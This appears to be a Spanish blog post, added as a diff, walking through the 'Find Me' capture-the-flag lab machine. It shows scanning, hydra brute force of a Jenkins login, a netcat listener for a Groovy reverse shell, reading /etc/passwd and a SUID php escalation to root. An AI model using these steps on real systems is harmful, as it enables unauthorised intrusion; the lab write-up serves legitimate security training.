@@ -1,0 +1,124 @@
+---
+layout: post
+title: "Find Me"
+date: 2024-06-18 13:20:23
+category: sample
+vm: hackerlabs
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Find Me </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://thehackerslabs.com/find-me/" target="_blank"> Descarga</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/thehackerlabs/FindMe/host.png){:.margin}
+
+**1\.** Escando dispositivos activos en la red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![img](/notas/public/img/thehackerlabs/FindMe/arp.png){:.margin}
+
+**2\.** Escaneado puertos y servicios activos de la maquina.
+
+`sudo nmap -p- --open -T5 -sCV --min-rate=5000 -n -Pn 192.168.1.7`
+
+![img](/notas/public/img/thehackerlabs/FindMe/nmap.png){:.margin}
+
+**3\.** Revisando la web, por el 80 corre la web apache por defecto y en el 8080 tenemos un panel login.
+
+`http://192.168.1.7:80`
+
+`http://192.168.1.7:8080`
+
+![img](/notas/public/img/thehackerlabs/FindMe/80.png){:.margin}
+
+**4\.** Me conecto por ftp, encuentro un archivo, lo descargo para ver el contenido.
+
+`ftp 192.168.1.7`
+
+`dir`
+
+`get ayuda.txt`
+
+`cat ayuda.txt`
+
+![img](/notas/public/img/thehackerlabs/FindMe/ftp.png){:.margin}
+![img](/notas/public/img/thehackerlabs/FindMe/ayudatxt.png){:.margin}
+
+**5\.** Creando el diccionario para la contraseña.
+
+`crunch 5 5 -t p@@@a -o dict.txt`
+
+`cat dict.txt`
+
+![img](/notas/public/img/thehackerlabs/FindMe/crunch.png){:.margin}
+
+**6\.** Haciendo fuerza bruta al login de jenkins.
+
+`hydra -l geralt -P dict.txt -f 192.168.1.7 -s 8080 http-get`
+
+![img](/notas/public/img/thehackerlabs/FindMe/hydra.png){:.margin}
+
+   **7\.** Ya puedo acceder al jenkins.
+
+![img](/notas/public/img/thehackerlabs/FindMe/jenkins.png){:.margin}
+
+**8\.** Podemos hacer uso de la consola de jenkins, (Administrar jenkins-Script console).
+
+![img](/notas/public/img/thehackerlabs/FindMe/console.png){:.margin}
+
+**9\.** Obteniendo un reverse shell, podemos usar [revshell](https://www.revshells.com/) para generar codigo groovy.
+
+_9.1- Genero la revershe shell en groovy_
+
+![img](/notas/public/img/thehackerlabs/FindMe/revshell.png){:.margin}
+
+_9.2- Me pongo en escucha_
+
+`sudo nc -nlvp 443`
+
+_9.3- Me envio la shell y obtengo la conexion_
+
+![img](/notas/public/img/thehackerlabs/FindMe/execute.png){:.margin}
+![img](/notas/public/img/thehackerlabs/FindMe/ncok.png){:.margin}
+
+**10\.** Veo que tenemos el usuario geralt, pruebo a migrar con la misma contraseña y si, se pudo.
+
+`cat /etc/passwd | grep sh`
+
+`su geralt`
+
+![img](/notas/public/img/thehackerlabs/FindMe/catpasswd.png){:.margin}
+
+**11\.** Buscando binarios SUID, tenemos el php.
+
+`cd /home/geralt`
+
+`find / -perm -4000 2>/dev/null`
+
+![img](/notas/public/img/thehackerlabs/FindMe/suid.png){:.margin}
+
+**12\.** Escalando privilegios a root. [gtfobins](https://gtfobins.github.io/gtfobins/php/#suid).
+
+`/usr/bin/php8.2 -r "pcntl_exec('/bin/bash', ['-p']);"`
+
+![img](/notas/public/img/thehackerlabs/FindMe/root.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
